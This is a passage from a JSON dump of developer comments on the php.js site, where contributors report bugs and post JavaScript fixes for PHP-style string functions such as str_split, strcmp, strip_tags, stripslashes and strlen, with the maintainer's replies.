Zamir: I agree we should stick to PHP's implementation wherever we can. Thanks for your improvement!"},{"date":"2009-02-14 18:11:29","author":"tomasoma","url":"www.tomatoma.eu","comment":"I'm a novice sorry my comments are in french hehehe\r\nI just needed the \"real\" split function which return a table from a string divide by a specified character : here is a new method for the string object : \r\n\r\ngood web site great ideas !!! thanks !!! ;-)\r\n\r\n[CODE=\"Javascript\"]\r\n\/\/\tle split sur un caract\u00c3\u00a8re qui retourne un tableau \r\n\/\/\tbug peut-\u00c3\u00aatre si le caract\u00c3\u00a8re recherch\u00c3\u00a9 est pr\u00c3\u00a9sent \u00c3\u00a0 l'index 0\r\nfunction split(car){\r\n\tvar tab = new Array();\r\n\tvar deb;\r\n\tvar fin=0;\r\n\tvar i=0;\r\n\tvar test;\r\n\twhile(test!=-1){\r\n\t\tdeb=fin;\r\n\t\tfin=this.indexOf(car,deb+1);\r\n\t\ttest=fin;\r\n\t\tif(fin==-1){fin=this.length;}\r\n\t\tif(deb!=0){deb++;}\r\n\t\ttab[i]=this.substring(deb,fin);\r\n\t\ti++;\r\n\t}\r\n\/\/\talert(tab);\r\n\treturn tab;\r\n}\r\nString.prototype.split = split;\r\n\r\nfunction test(){\r\n\tvar text=\"toma%soma%c'est cool on test tout%76898644\";\r\n\talert(text.split(\"%\"));\r\n}\r\n\r\n[\/CODE]"},{"date":"2009-02-15 01:58:43","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Hello and bonjour tomasoma,\r\n\r\nThanks for sharing. Kevin likes to stick with the default PHP behavior in functions here, but I presume he won't mind a useful tip here.\r\n\r\nHowever, I'm not clear though why you felt you needed to add a split function which JavaScript already has? Is it fixing bug in some browser? In Firefox I get the same behavior with your function as with JS split()..."},{"date":"2009-02-15 16:35:08","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ tomasoma: You could also look at the explode() function. It's based on JavaScript's own .split() function, but adds support for PHP's arguments: limit.\r\n\r\nMaybe I'm not getting you right though: Feel free to point out something I'm missing here."},{"date":"2009-10-18 05:04:48","author":"Theriault","url":"","comment":"Here's a shorter version that runs faster than the current one. \r\n[CODE]\r\nfunction str_split(s, l) {\r\n    if (s == undefined || !s.toString || l < 1) {\r\n        return false;\r\n    }\r\n    return s.toString().match(new RegExp('.{1,' + (l || '1') + '}', 'g')); \r\n}\r\n[\/CODE]"},{"date":"2009-10-25 13:58:56","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Theriault: As always, brilliant stuff man! I've added your code. Proof: \nhttp:\/\/github.com\/kvz\/phpjs\/commit\/718895323939ff5e0f674a537e9a4546fce71c6e ; )\n\nWill be online here shortly as well!"},{"date":"2010-03-31 03:00:28","author":"nimatramon","url":"http:\/\/jabe.ir","comment":"thanx man "},{"date":"2010-09-04 23:28:07","author":"Bjorn Roesbeke","url":"http:\/\/www.bjornroesbeke.be","comment":"There's something wrong with this function but due to a lack of Javascript knowledge i can only provide the testcase.\n\nI split a string:\nhttp:\/\/shared.bjornroesbeke.be\/phpjs\/count_splitted_test.php\n\nAnd when i count the number of items the results differ:\nhttp:\/\/shared.bjornroesbeke.be\/phpjs\/count_splitted_result.png\n\nNote that count() seems to function properly:\nhttp:\/\/shared.bjornroesbeke.be\/phpjs\/count_regular_test.php"},{"date":"2010-09-05 00:54:17","author":"Rafa? Kukawski","url":"http:\/\/blog.kukawski.pl","comment":"The problem is, that IE adds some properties to the result array (input, index, lastIndex) and count() also counts them.\nBeside that, str_split won't work for multiline strings.\nBelow another approach to this problem\n\n[CODE]function str_split(string, split_length) {\n    if (string == null || split_length < 1) {\n        return false;\n    }\n    string += '';\n    var chunks = [], pos = 0, len = string.length;\n    while(pos < len){\n\t\tchunks.push(string.slice(pos, pos += split_length));\n    }\n\n    return chunks;\n }[\/CODE]"},{"date":"2010-09-05 01:00:30","author":"Rafa? Kukawski","url":"http:\/\/blog.kukawski.pl","comment":"split_length should be optional\n\n[CODE]function str_split(string, split_length) {\n\tif(split_length == null){\n\t\tsplit_length = 1;\n\t}\n\tif (string == null || split_length < 1) {\n\t\treturn false;\n\t}\n\tstring += '';\n\tvar chunks = [], pos = 0, len = string.length;\n\twhile(pos < len){\n\t\tchunks.push(string.slice(pos, pos += split_length));\n\t}\n\treturn chunks;\n}[\/CODE]"},{"date":"2010-09-08 19:46:46","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Bjorn Roesbeke & Rafa\u0142 Kukawski: Thanks for reporting & fixing the issue. Will be online shortly, but already fixed here:  https:\/\/github.com\/kvz\/phpjs\/commit\/c83cf0d3bd5734444e5397af42b5f560240a9c54\n"}],"strcmp":[{"date":"2008-05-08 17:24:41","author":"Steve Hilder","url":"","comment":"Err... this doesn't work at all; it only evaluates the first character.\r\n\r\n[CODE=&quot;Javascript&quot;]strcmp('test', 'tomato') = 0 \/* incorrect *\/[\/CODE]"},{"date":"2008-05-08 22:16:21","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Steve Hilder: I must say I'm not very familiar with this specific function, but I did some reading up on it, and I think I agree that in it's current form it makes no sense. I've updated it so calculate every character in both strings, this is better right."},{"date":"2008-06-18 20:14:20","author":"gorthaur","url":"","comment":"You gotta be kidding! This code is unbelievably silly and displays gross lack of understanding string comparison. Try these test cases\r\n[CODE=&quot;Javascript&quot;]\r\nstrcmp( 'waldo', 'owald' );\r\nstrcmp( 'owald', 'waldo' );\r\n[\/CODE]\r\nwhich should return +1 and -1.\r\nThis should work:\r\n[CODE=&quot;Javascript&quot;]\r\nfunction strcmp ( str1, str2 ) {\r\n    return ( ( str1 == str2 ) ? 0 : ( ( str1 &gt; str2 ) ? 1 : -1 ) );\r\n}\r\n[\/CODE]"},{"date":"2008-06-18 22:49:20","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ gorthaur: I must admit I personally never use this function in PHP. Thanks for improving php.js."},{"date":"2009-01-28 17:04:11","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Here's a related one...\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction strncmp ( str1, str2, lgth ) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Waldo Malqui Silva\r\n    \/\/ +      input by: Steve Hilder\r\n    \/\/ +   improved by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n    \/\/ +    revised by: gorthaur\r\n\r\n    s1 = str1.substr(0, lgth);\r\n    s2 = str2.substr(0, lgth);\r\n    return ( ( s1 == s2 ) ? 0 : ( ( s1 &gt; s2 ) ? 1 : -1 ) );\r\n}\r\nalert(strncmp('aaa', 'aab', 2)); \/\/ 0\r\nalert(strncmp('aaa', 'aab', 3)); \/\/ -1[\/CODE]"},{"date":"2009-02-01 22:05:04","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: sweet!"},{"date":"2009-04-08 11:10:41","author":"narendra","url":"www.systech.com","comment":"just fun"},{"date":"2009-07-24 23:31:02","author":"coderjoe","url":"http:\/\/www.coderjoe.net","comment":"Couldn't this use ECMA-262's String.prototype.localeCompare function?\r\n\r\n[CODE]\r\nfunction strcmp ( str1, str2 ) {\r\n    \/\/ Binary safe string comparison  \r\n    \/\/ using ECMA-262 section 15.5.4.9\r\n    \/\/ String.prototype.localeCompare    \r\n    return str1.localeCompare(str2);\r\n}\r\n[\/CODE]\r\n"},{"date":"2009-07-24 23:31:23","author":"coderjoe","url":"http:\/\/www.coderjoe.net","comment":"Couldn't this use ECMA-262's String.prototype.localeCompare function?\n\n[CODE]\nfunction strcmp ( str1, str2 ) {\n    \/\/ Binary safe string comparison  \n    \/\/ using ECMA-262 section 15.5.4.9\n    \/\/ String.prototype.localeCompare    \n    return str1.localeCompare(str2);\n}\n[\/CODE]\n"},{"date":"2009-07-29 03:08:54","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@coderjoe: Up until you mentioned it, we were using strcoll() to do this, since that is PHP's locale-specific version; however, in SVN, I just changed the behavior of strcoll() to avoid using this built-in but non-transparent JS locale-aware sort function in favor of letting strcoll()'s behavior be configurable through setlocale() (which I also just modified--LC_COLLATE to be specific). This will let people set the locale to whatever locale they wish (though we currently only have an English collating function implemented in setlocale())."},{"date":"2009-08-04 11:29:23","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ coderjoe & Brett Zamir: awesome : )"}],"strip_tags":[{"date":"2008-05-23 23:04:13","author":"Rauan","url":"","comment":"Ok, that's great... But where is exception in regex for allowed_tags?"},{"date":"2008-05-31 12:33:05","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Rauan: PHP.JS is by no means a full PHP implementation in Javascript. But thanks for pointing this out, I've added the functionality"},{"date":"2008-06-01 21:32:46","author":"Rauan","url":"","comment":"Wow. Thanks, Kevin. That's the very important feature. :)"},{"date":"2008-06-20 06:17:43","author":"Mohammed","url":"","comment":"Thanks!"},{"date":"2008-07-09 03:23:59","author":"Steven Richards","url":"","comment":"The strip_tags() function appears to be broken in IE7. Upon detecting an opening tag, it completely removes ALL output. The same behavior appears on the test page on this site. It appears that in IE, the match() function returns a copy of the input string and a couple other extraneous values on a successful match, causing the entire string to be replaced by the first matched key (the original input).\r\n\r\nTo fix, I added this ugly piece of work inside the key loop:\r\n[CODE=&quot;Javascript&quot;]\r\nif (key == '0' || Number(key.toString()))\r\n{\r\n\/\/ replacement\r\n}\r\n[\/CODE]"},{"date":"2008-07-18 09:29:26","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Steven Richards: I've made what I think is the right change. Does this work okay?"},{"date":"2008-09-15 15:44:15","author":"Pul","url":"","comment":"try\r\n[CODE=&quot;Javascript&quot;]\r\nstrip_tags(&quot;&lt;a href='index.html'&gt;test&lt;\/a&gt;&quot;, &quot;&lt;a&gt;&quot;);\r\n[\/CODE]\r\n\r\nplease fix.. :P"},{"date":"2008-09-17 13:06:23","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Pul: Thank you for pointing that out. I've fixed the code and added your usage example so it will be tested in the future as well."},{"date":"2008-10-20 21:02:54","author":"Alex","url":"http:\/\/deliciousdemon.com","comment":"It looks like there's a small difference in your JS implementation of strip_tags from PHP's implementation:\r\n\r\nPHP declares multiple allowable tags like this: strip_tags('&lt;p&gt;&lt;b&gt;text&lt;\/b&gt;&lt;\/p&gt;', '&lt;p&gt;&lt;b&gt;')\r\n\r\nThe JS version is like this:\r\nstrip_tags('&lt;p&gt;&lt;b&gt;text&lt;\/b&gt;&lt;\/p&gt;', '&lt;p&gt;,&lt;b&gt;')\r\n\r\nNote the comma separation in the JS version between the allowable tags. It's not a big deal, but I thought I'd point it out, as it tripped me up for a while (and I thought you'd want to know since you're attempting to make these functions work syntactically the same as their PHP equivalents). Thanks!"},{"date":"2008-10-21 10:07:37","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Alex: I wasn't aware of this implementation. And, you're right: it is our objective to mimic php as much as reasonably possible. Thanks for sharing, I've updated the function and credited you accordingly."},{"date":"2008-11-18 10:50:12","author":"Marc Palau","url":"http:\/\/www.nbsp.es","comment":"Why is defined allowed_keys??\r\n\r\n[CODE=&quot;Javascript&quot;]var allowed_keys = {};[\/CODE]"},{"date":"2008-11-18 12:27:39","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Marc Palau: That was a bit of legacy you spotted there, removed it. thx!"},{"date":"2009-01-24 06:36:43","author":"Computerzworld","url":"http:\/\/computerzworld.com","comment":"You have a great collection of  PHP equivalent javascript functions. This is really helpful to develpers. Thanks for sharing."},{"date":"2009-02-27 22:05:14","author":"Eric Nagel","url":"http:\/\/www.ericnagel.com\/","comment":"Thanks for the function.  I added:\r\n[CODE=&quot;Javascript&quot;]\r\nvar k = '', i = 0;\r\n[\/CODE]\r\n\r\nin your variable declarations, as I was using k and i outside the function, which put things into a nasty loop.  Hope this helps someone."},{"date":"2009-03-02 14:39:39","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Eric Nagel: Great, thanks for pointing that out!"},{"date":"2009-03-04 20:46:13","author":"Michael Grier","url":"","comment":"what does !! do here? validate? convert int to bool? \n\narray unique is using this function internally, but array_unique is not working for me (it returns undefined), and I'm trying to figure out why."},{"date":"2009-03-22 18:55:32","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Bobby Drake: Thanks for pointing that out. I fixed the bug and added your testcase to prevent future bugs. Thanks!"},{"date":"2009-07-22 15:37:14","author":"Tomasz Wesolowski","url":"","comment":"That's some useful code. :)\n\nUnfortunately it seems to fail on header tags <h1>..<h7>. I have probably fixed that by changing the line 42:\n\n\/\/ Build allowes tags associative array\n[code]if (allowed_tags) {\n    allowed_array = allowed_tags.match(\/([a-zA-Z]+)\/gi);\n}[\/code]\n\nto \n\n[code]allowed_array = allowed_tags.match(\/([a-zA-Z0-9]+)\/gi);[\/code]"},{"date":"2009-07-22 15:39:08","author":"Tomasz Wesolowski","url":"","comment":"Oops, no HTML escaping in posts? Here's a cleaner repost:\n---\n\nThat's some useful code. :)\n\nUnfortunately it seems to fail on header tags h1..h7. I have probably fixed that by changing the line 42:\n\n[code]\/\/ Build allowes tags associative array\nif (allowed_tags) {\n    allowed_array = allowed_tags.match(\/([a-zA-Z]+)\/gi);\n}[\/code]\n\nto \n\n[code]allowed_array = allowed_tags.match(\/([a-zA-Z0-9]+)\/gi);[\/code]"},{"date":"2009-07-24 12:29:04","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Tomasz Wesolowski: Very kind of you to provide the fix! I've added it to SVN along with the credits.\n\nPS: oops indeed! fixed the comment issue"},{"date":"2009-07-29 03:06:44","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Kevin: Thanks for the security fix, and sorry I'm too busy to look into it myself at the moment, but now the code snippets are showing less-than signs, etc. in entity form..."},{"date":"2009-08-04 12:30:14","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Ok provided an additional fix. After comment caches clear we should be able to review the results."},{"date":"2010-07-14 10:18:52","author":"Chris","url":"","comment":"Hey,\nI have a slight problem with html comments. See this example:\n[code]<h2 class=\"error\">Ooops, das h\u00e4tte nicht passieren d\u00fcrfen!<\/h2>\n\n<div class=\"graybox\">\nDie angegebene Adresse ist mit Ihren Benutzerrechten nicht erreichbar.<br \/>\n<!--Sie werden in <strong id=\"cnt\">&nbsp;<\/strong> Sekunden zur Startseite weitergeleitet...-->\n<\/div>[\/code]\n\nJS result:\n[code]Ooops, das h\u00e4tte nicht passieren d\u00fcrfen! Die angegebene Adresse ist mit Ihren Benutzerrechten nicht erreichbar. &nbsp; Sekunden zur Startseite weitergeleitet...-->[\/code]\n\nSee missing \"Sie werden in\" and additional \"-->\" in the JS result."},{"date":"2010-07-15 08:39:26","author":"Rafa? Kukawski","url":"http:\/\/blog.kukawski.pl","comment":"Maybe sth like this?\n\n[CODE]function strip_tags(input, allowed){\n   allowed = (((allowed || \"\") + \"\")\n      .toLowerCase()\n      .match(\/<[a-z][a-z0-9]*>\/g) || [])\n      .join(''); \/\/ making sure the allowed arg is a string containing only tags in lowercase (<a><b><c>)\n   var reg = \/(<\\\/?([a-z][a-z0-9]*)\\b[^>]*>)\/gi;\n   return input.replace(reg, function($0, $1, $2){\n      return allowed.indexOf('<' + $2.toLowerCase() + '>') > -1 ? $0 : '';\n   });\n}[\/CODE]"},{"date":"2010-07-15 12:02:30","author":"Rafa? Kukawski","url":"http:\/\/blog.kukawski.pl","comment":"I extended my previous solution with removing comments and php tags. May not be perfect, but should work for most cases\n\n[CODE]function strip_tags(input, allowed){\n   allowed = (((allowed || \"\") + \"\")\n      .toLowerCase()\n      .match(\/<[a-z][a-z0-9]*>\/g) || [])\n      .join(''); \/\/ making sure the allowed arg is a string containing only tags in lowercase (<a><b><c>)\n   var tags = \/<\\\/?([a-z][a-z0-9]*)\\b[^>]*>\/gi,\n       commentsAndPhpTags = \/<!--[\\s\\S]*?-->|<\\?(?:php)?[\\s\\S]*?\\?>\/gi;\n   return input.replace(commentsAndPhpTags, '').replace(tags, function($0, $1){\n      return allowed.indexOf('<' + $1.toLowerCase() + '>') > -1 ? $0 : '';\n   });\n}[\/CODE]"},{"date":"2010-09-07 23:14:41","author":"Evertjan Garretsen","url":"","comment":"I discovered that when i allow br, this wil not allow the xhtml closed br like: <br\/>. Maybe the following line should be added?\r\n[code]\r\nif (i != 0) { i = html.toLowerCase().indexOf('<'+allowed_tag+'\/>');}\r\n[\/code]\r\n"},{"date":"2010-09-08 20:06:17","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Chris: Sorry, if the comment system is letting you down here, could you try pasting to pastebin.org?\n\n@ Evertjan Garretsen: Looks like the PHP version needs you to explicitly put br\/ in the list of allowed tags\n\n@ Rafa\u0142 Kukawski: Sublime man. In fact your creation's so good that it's better than PHP's version. Have a look at example 6 and you will see that PHP (5.3.2) will require you to explicitly name br\/ in the allow list.\n\nI'm still including your version in php.js, though, as I don't think this will cause bad bugs for people (seems like if you're whitelisting br you intend to whitelist br\/ as well) so we can fix it later on.\n\nhttps:\/\/github.com\/kvz\/phpjs\/commit\/526ac02243899b12cd0929c0a25133304525c0e8\n"},{"date":"2011-03-31 09:29:16","author":"sacdmn sda.m,c nads,.cn n65467289376541248321908643218694321","url":"jkhvkjb","comment":"!@#$%^&*())(*&^%$#@"},{"date":"2012-03-28 05:16:43","author":"Roger","url":"","comment":"Awesome & thanks!"},{"date":"2012-04-04 14:33:20","author":"????? ?????? ? ?????","url":"http:\/\/an3m1.com\/","comment":"I wonder how you got so good. HaHa ! This is really a fascinating blog, lots of stuff that I can get into. One thing I just want to say is that your design is so perfect ! You certainly know how to get a girls attention ! I\u2019m glad that you\u2019re here. I feel like I\u2019ve learned something new by being here \n"}],"stripos":[{"date":"2008-03-07 15:15:15","author":"call_user_func_array","url":"","comment":"[CODE=&quot;Javascript&quot;]\r\n\/**\r\n * @author Thiago Mata\r\n * @date 07\/03\/2008\r\n * @param callback strFunctionName\r\n * @param array arrParam\r\n * @return mixer\r\n * @url thiagomata.blog.com\r\n *\/\r\nfunction call_user_func_array(  strFunctionName , arrParam )\r\n{\r\n\tvar strCommand = &quot;&quot;;\r\n\tvar i;\r\n\t\r\n\tstrCommand += &quot;return &quot; + strFunctionName + &quot;(&quot;;\r\n\tfor( i = 0; i &lt; arrParam.length; ++i )\r\n\t{\r\n\t\tstrCommand += &quot;arrParam[&quot; + i + &quot;]&quot; ;\r\n\t\tif( ( i + 1 ) != arrParam.length )\r\n\t\t{\r\n\t\t\tstrCommand += &quot;,&quot;; \r\n\t\t}\r\n\t}\r\n\tstrCommand += &quot;)&quot;;\r\n\tvar oFunction = new Function( &quot;arrParam&quot; , strCommand );\r\n\treturn oFunction( arrParam );\r\n} \r\n[\/CODE]"},{"date":"2008-03-07 19:29:30","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Thiago Mata: Thanks alot, I've added the function!"},{"date":"2008-10-04 17:41:10","author":"Onno Marsman","url":"","comment":"Improved to accept things other than strings. Also &quot;if(f_offset == undefined) {&quot; seemed useless since indexOf accepts undefined as a 0 anyway. Also changed &gt; -1 to !== -1, to increase performance a tiny bit.\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction stripos ( f_haystack, f_needle, f_offset ) {\r\n    var haystack = (f_haystack+'').toLowerCase();\r\n    var needle = (f_needle+'').toLowerCase();\r\n    var index = 0;\r\n\r\n    if ((index = haystack.indexOf(needle, f_offset)) !== -1) {\r\n        return index;\r\n    }\r\n    return false;\r\n}\r\n[\/CODE]"},{"date":"2008-10-06 12:08:20","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsman: Processed. Thank you!"}],"stripslashes":[{"date":"2008-01-23 18:35:44","author":"Ates Goral","url":"","comment":"stripslashes() unescapes octal and hexadecimal ASCII code sequences as well. So we should have instead:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nreturn str.replace(\/\\\\([&quot;'\\\\])\/g, &quot;$1&quot;).replace(\/(\\\\(?:[0-7]{1,3}|x[\\dA-Fa-f]{1-2}))\/g, function(code) { return String.fromCharCode(code); });\r\n[\/CODE]\r\n\r\nAdditional test:\r\n[CODE=&quot;Javascript&quot;]\r\n    \/\/ *     example 2: stripslashes(&quot;Hello\\x20World\\41&quot;);\r\n    \/\/ *     returns 2: &quot;Hello World!&quot;\r\n[\/CODE]"},{"date":"2008-01-23 20:25:53","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Ates Goral: Nicely crafted."},{"date":"2008-01-23 21:09:44","author":"Ates Goral","url":"","comment":"Thanks Kevin! Err... I want my credits in the function comments (I'm keen on keeping the two medals, at least for a while) ;)"},{"date":"2008-01-23 21:45:01","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Ates Goral: Obviously!"},{"date":"2008-01-27 17:56:26","author":"Mickael9","url":"","comment":"Hello,\r\n\r\nAtes Goral, you're totally wrong !\r\nstripslashes only removes \\ it DOES NOT unescapes octal and hexadecimal code sequences, you are experimenting in a wrong way, remember, when you call stripslashes('\\x20'), PHP ITSELFS turns \\x20 in a space, not your function, read the addslashes manual, it onlty turns ' into \\', &quot; into \\&quot;, \\ into \\\\ and NULL into \\0.\r\n\r\nHere is the fixedfunction :\r\n[CODE=&quot;Javascript&quot;]function stripslashes (str)\r\n{\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   improved by: Ates Goral (http:\/\/magnetiq.com)\r\n    \/\/ +   fixed by: Mick@el\r\n    \/\/ *     example : stripslashes(&quot;Kevin\\\\\\\\'s code&quot;);\r\n    \/\/ *     returns : 'Kevin\\'s code'\r\n    return str.replace(\/\\\\0\/g, '\\0').replace(\/\\\\(.)\/g, '$1')\r\n}\r\n[\/CODE]"},{"date":"2008-01-27 17:59:49","author":"Mickael9","url":"","comment":"Huh, sorry, I meant stripslashes(&quot;\\x20&quot;), not stripslashes('\\x20')"},{"date":"2008-01-29 20:52:23","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Mickael9: Thanks for your input!"},{"date":"2008-10-04 17:11:20","author":"Onno Marsman","url":"","comment":"stripslashes(6) won't work. Fix:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction stripslashes( str ) {\r\n    return (str+'').replace('\/\\0\/g', '0').replace('\/\\(.)\/g', '$1');\r\n}\r\n[\/CODE]"},{"date":"2008-10-06 12:02:05","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsmann: Fixed, thank you!"},{"date":"2008-12-15 15:26:17","author":"rezna","url":"http:\/\/rezna.info","comment":"stripslashes doesn't work, the implementation should be this\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nreturn (str+'').replace(\/\\0\/g, '0').replace(\/\\\\([\\\\'&quot;])\/g, '$1');\r\n[\/CODE]\r\n\r\nand your sample code should be\r\n[CODE=&quot;Javascript&quot;]\r\nstripslashes('Kevins\\\\\\'s code')\r\n[\/CODE]"},{"date":"2008-12-17 13:25:10","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ rezna: Ok as I see it your code only replaces  either \\ or ' or &quot;, and not any other character that is escaped. Fair enough. But are you sure the previous function didn't work? It didn't give issues in the test suite. Not even with the old implementation and your new sample code."},{"date":"2009-05-29 04:18:28","author":"Dave Baldwin","url":"http:\/\/www.dibsplace.com","comment":"I just had to use this to get rid of a slash \"\\'\" because the single quote was really the htmlentity \"&#39;\":\n\n[CODE]\nstr=str.replace(\/\\\\&#39;\/g,\"'\");\n[\/CODE]\n"},{"date":"2009-06-03 22:26:56","author":"Rick Waldron","url":"","comment":"Just out of curiousity... how come you didn't write these functions as methods of an object?\nexample:\n[CODE]\nString.prototype.stripslashes = function() {\n  return this.replace('\/\\0\/g', '0').replace('\/\\(.)\/g', '$1')\n}\n[\/CODE]\n\nthat way you dont have to force it into a string, it can now also be chained... like...\n\n[CODE]\nvar str = \"that's everything folks\";\nstr.stripslashes().replace('everything', 'all');\n[\/CODE]\n\n\n\nnote... i used the corrected version posted by Onno Marsman below.\n"},{"date":"2009-06-03 23:02:08","author":"Rick","url":"","comment":"I posted that with a bit of haste...\n\nsome corrections:\n[CODE]\nString.prototype.stripslashes = function() {\n  return  this.replace(\/\\\\'\/g,'\\'')\n                .replace(\/\\\\\"\/g,'\"')\n                  .replace(\/\\\\\\\\\/g,'\\\\')\n                    .replace(\/\\\\0\/g,'\\0');\n}\n\/\/ that can also be added to for htmlentity support. but thats not the point i'm trying to make.\n\nvar str = \"that\\'s everything folks\";\nstr.stripslashes().replace('everything', 'all');\n\/\/ stripslashes, then demonstrates chainability\n[\/CODE]\n"},{"date":"2009-06-04 01:46:57","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Hi Rick,\n\nIt turns out stripslashes doesn't only strip those next to quotation works, even though addslashes only adds them this way. But it does preserve double-backslashed items and does convert the NULL character. I've optimized the handling to avoid going over the same characters again as well as handled removing backslashes at the end.\n\nAs far as string conversion, it seems PHP does convert first to a string (at least with integers), so I think we're ok there.\n\nAs far as chaining via the prototype, though that can definitely be convenient, for larger scripts, there is a potential for a clash of implementations (e.g., someone may later override the prototype with their own function, say stripslashes() which say only strips slashes next to quotes). These are kind of like globals and really are to be avoided at least for library projects. \n\nWe could still conceivably get chaining of methods, such as jQuery does, by first making our string into an object, for example:\n\n[CODE]var newStr = $PJ(str).addslashes().str_replace('stuff', '').exit();[\/CODE]\n\n...but this would require making a version of PHP.JS where each function returned \"this\", and we'd need to define the constructor and exit methods. Not sure how popular that would be either, though it could be done."},{"date":"2009-06-10 14:49:55","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Rick & Brett Zamir: Well for one thing it isn't part of PHP functions. And that's what we're providing here. If people want to take that functionality and wrap it in something that does provide chaining, they are free to do so, and the namespaced version of php.js would probably be easiest to extend on.\n\nThat said, I've seen rumours that PHP6 does support chaining so by the time that it's stable we may have to support it after all :)"},{"date":"2009-12-29 21:25:05","author":"Robert Hollencamp","url":"http:\/\/power-user-tools.no-ip.org","comment":"Line 19 (return '\\u000';) causes parse errors in safari and IE; adding an extra 0 (return '\\u0000';) seems to fix the problem"},{"date":"2009-12-30 07:00:23","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Robert Hollencamp: yes, thanks, you are correct. Previously fixed in Git, but not yet making it to the site here."},{"date":"2011-09-02 11:48:37","author":"technomixx","url":"http:\/\/www.technomixx.com","comment":"Great, nice script, I have used it working well thanks."},{"date":"2012-09-12 08:45:35","author":"Baijun","url":"","comment":"Thanks bro... its really helpful to me...."}],"stristr":[{"date":"2011-12-21 11:15:15","author":"Patrick De Ridder","url":"www.univer.be","comment":"I installed this module v1.3_0208\nI received it directly sfrom ogone\nbut I cannot succeed to install it, I get http 500 erver connection error\nis this module ready to use or not?\nif ok, what could be my problem?"},{"date":"2012-06-16 07:49:30","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Patrick De Ridder: Sorry, but no idea what you're talking about."}],"strlen":[{"date":"2008-05-16 00:58:35","author":"Sakimori","url":"","comment":"In PHP, strlen(45) returns 2. With the above JS implementation, strlen(45) returns undefined (numbers have no &quot;length&quot; property).\r\n \r\nYou might consider changing it to:\r\n[CODE=&quot;Javascript&quot;]\r\nreturn String(string).length;\r\n[\/CODE]\r\n... or maybe even:\r\n[CODE=&quot;Javascript&quot;]\r\nreturn (&quot;&quot; + string).length;\r\n[\/CODE]"},{"date":"2008-05-16 16:45:47","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Sakimori: Cool, thank you for improving our project!"},{"date":"2008-09-06 01:29:38","author":"Kirk Strobeck","url":"http:\/\/weareinto.com","comment":"There is one problem, this returns NULL if empty, it should return 0, so you can test in an if statement without an error."},{"date":"2008-09-08 00:20:19","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Kirk Strobeck: I've added some code that I think would make it better. But if you could provide the code that breaks it, that would help greatly, we can then also add it to the examples so it will be tested thoroughly.\r\n\r\nThank you!"},{"date":"2008-10-04 17:19:21","author":"Onno Marsman","url":"","comment":"The l variable doesn't seem to do much. As far as I can see this function is exactly the same as the following:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction strlen (string) {\r\n    return (string+'').length;\r\n}\r\n[\/CODE]\r\n\r\nThis is already suggested by Sakimori but for some reason his code didn't make it into the function. I think it should."},{"date":"2008-10-06 12:05:25","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsman: I guess sakimori's change slipped through. He did make it into the comments.\r\nI believe the reason for the if statement is that you want to have strlen return 0, even if it returns false. What do you think about this implementation?"},{"date":"2008-10-06 15:34:12","author":"Onno Marsman","url":"","comment":"This was already covered.\r\n(string+'') is always a string so (string+'').length always is an integer and can never result into false.\r\nSo the || 0 can be removed.\r\n\r\nThere is some behavior that doesn't correspond to PHP behavior and that is when you apply strlen to an array or object. But I don't think there will be a need to check this, and Javascripts behavior can be considered to be better. (calling .toString() on an object when the concatenation occurs)"},{"date":"2008-10-06 